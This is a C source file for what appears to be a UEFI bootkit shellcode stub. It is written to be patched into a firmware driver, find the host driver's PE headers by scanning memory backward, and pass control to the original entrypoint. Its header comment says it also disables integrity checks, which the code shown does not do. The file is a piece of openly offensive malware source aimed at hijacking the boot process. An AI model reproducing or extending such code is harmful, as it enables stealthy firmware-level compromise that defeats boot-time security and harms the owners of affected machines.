#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Locates the PE header of the driver we are patched into, disables integrity
 * checks and executes the original entrypoint to continue the boot process
 * as normal.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EfiMain( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE * SystemTable )
{
	PSHELLCODE_CONFIG	ShcConfig = NULL;
	PIMAGE_DOS_HEADER	DosHeader = NULL;
	PIMAGE_NT_HEADERS	NtHeaders = NULL;

	/* Set the configuration address */
	ShcConfig = C_PTR( &EndOfCode );

	/* Get the 'DOS' header */
	DosHeader = C_PTR( &EfiMain );
	DosHeader = C_PTR( U_PTR( U_PTR( DosHeader ) &~ ( 0x20 - 1 ) ) );

	do 
	{
		/* Is this the DOS header? */
		if ( DosHeader->e_magic == IMAGE_DOS_SIGNATURE ) {
			/* Is this the right e_lfanew ? */
			if ( DosHeader->e_lfanew == ShcConfig->LfaNew ) {
				/* Get the pointer to the NT headers */
				NtHeaders = C_PTR( U_PTR( DosHeader ) + DosHeader->e_lfanew );

				/* Is this the the NT headers? */
				if ( NtHeaders->Signature == IMAGE_NT_SIGNATURE ) {
					/* Abort */
					break;
				};
			};
		};

		/* Decrement until all the conditions are met */
		DosHeader = C_PTR( U_PTR( DosHeader ) - 0x20 );
	} while ( TRUE );

	/* Execute the original entrypoint */
	return ( ( __typeof__( EfiMain ) * ) C_PTR( U_PTR( DosHeader ) + ShcConfig->AofEnt ) )( ImageHandle, SystemTable );
};
